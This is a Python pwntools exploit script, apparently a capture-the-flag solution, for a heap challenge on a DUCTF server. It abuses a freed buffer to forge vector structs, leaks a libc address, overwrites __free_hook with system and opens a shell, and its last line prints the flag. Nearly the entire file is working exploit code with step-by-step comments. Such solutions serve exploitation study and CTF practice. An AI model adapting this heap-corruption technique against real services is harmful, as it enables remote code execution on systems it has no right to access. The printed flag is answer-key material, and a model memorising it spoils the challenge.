from pwn import *
from sys import argv

libc_elf = ELF('./libc.so.6')

if 'gdb' in argv:
    p = gdb.debug('./patched', gdbscript='b *create_vecc+26\nc', env={'LD_PRELOAD': './libc.so.6'})
else:
    p = remote('chal.duc.tf', 30007)

def create_vecc(index):
    p.sendlineafter('1: create vecc', '1')
    p.sendlineafter('Index?', str(index))
    p.recvuntil('Done!')
    return index

def show_vecc(index):
    p.sendlineafter('1: create vecc', '5')
    p.sendlineafter('Index?', str(index))
    p.recvline()
    p.recvuntil('> ')


def destroy_vecc(index):
    p.sendlineafter('1: create vecc', '2')
    p.sendlineafter('Index?', str(index))

def append(index, length, content):
    log.info(hex(len(content)))
    assert len(content) <= length, f'{len(content)} {length}'
    p.sendlineafter('1: create vecc', '3')
    p.sendlineafter('Index?', str(index))
    p.sendlineafter('Length?', str(length))
    p.sendline(content)

# Create a vector and a 0x10 buffer
create_vecc(0)
append(0, 0x10, b'a'*8 + p32(0) + p32(0x102020))

# Free the buffer and then the vector struct.
destroy_vecc(0)

# Takes vector0's chunk. This is not useful.
create_vecc(1)

# Takes buffer0's chunk. This is useful.
# vector2 will have 0x102020 capacity, because it takes the freed buffer chunk from vec 0.
# Also, the buffer member points to the next free 0x20 bin chunk.
create_vecc(2)

# This means we can take control of the tcache, or of the content of the next 0x20 chunk we allocate. 
# In this case, taking control of the tcache is just a side effect.
# What I'm really trying to do is defining the next vec struct.
# buffer = 0x602030
# size = 8
# capacity = [big number]
# Remember that append_vecc uses malloc to store the input.
# Do not use the 0x20 bin for it! That would defeat the point. Here I am using the 0x30 bin
append(2, 0x20, p64(0x602030) + p32(8) + b'a'*0x14)

# vec3 struct is initialized just like we wanted it.
# 0x602030 is on the .bss segment, just before the list of vec structs at 0x602040.
# 0x602030 contains a pointer to the libc's stdin struct, which means we can leak libc.
create_vecc(3)
show_vecc(3)
leak = u64(p.recv(8))
libc_elf.address = leak - libc_elf.sym['_IO_2_1_stdin_']
log.info(f'Libc: {hex(libc_elf.address)}')

# extend vec3 and make a fake vector on 0x602038, pointing to __free_hook - 8.
# Add the fake vec to the list of vectors, index 1
append(3, 0x40, p64(libc_elf.sym['__free_hook'] - 8) + p32(0) + p32(0x10000) + p64(0x602038) + b'a'*0x28)

# Overwrite free_hook. This input string will be placed in a temporary buffer, so we send /bin/sh\x00 first,
# And when free is called on the temporary buffer it will be taken as parameter to system.
append(1, 0x20, b'/bin/sh\x00' + p64(libc_elf.sym['system']) + b'a'*0x10)

p.interactive() # DUCTF{h@v_2_z3r0_ur_all0ca710n5}
